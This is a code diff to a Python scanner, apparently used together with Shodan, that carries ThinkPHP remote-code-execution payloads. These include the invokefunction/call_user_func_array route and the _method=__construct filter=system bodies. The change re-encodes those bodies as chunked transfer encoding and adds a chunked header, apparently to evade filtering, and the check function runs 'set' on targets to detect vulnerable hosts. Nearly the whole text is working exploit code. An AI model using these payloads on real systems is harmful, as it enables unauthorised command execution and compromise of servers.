@@ -3,9 +3,9 @@ import requests
 from shodan import Shodan
 
 data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=set"
-data_5010 = "s=set&filter%5B%5D=system&_method=__construct&method="
-data_5023 = "_method=__construct&filter[]=system&method=GET&get[]=set"
-data_5152 = "c=system&f=set&&_method=filter&"
+data_5010 = "35\r\ns=set&filter%5B%5D=system&_method=__construct&method=\r\n0\r\n\r\n"
+data_5023 = "38\r\n_method=__construct&filter[]=system&method=GET&get[]=set\r\n0\r\n\r\n"
+data_5152 = "1f\r\nc=system&f=set&&_method=filter&\r\n0\r\n\r\n"
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
@@ -13,10 +13,11 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.5',
     'Accept-Encoding': 'gzip, deflate',
     'Content-Type': 'application/x-www-form-urlencoded', 
+    'Transfer-Encoding': 'chunked',
 }
 
 def check_route(url):
-    r = requests.get(url+data_route,headers=headers,timeout=1)
+    r = requests.get(url+data_route,timeout=1)
     s = r.text.replace(" ","").lower()
     if "path=" in s and "user" in s:
         print(r.url,"route Vulnerable")
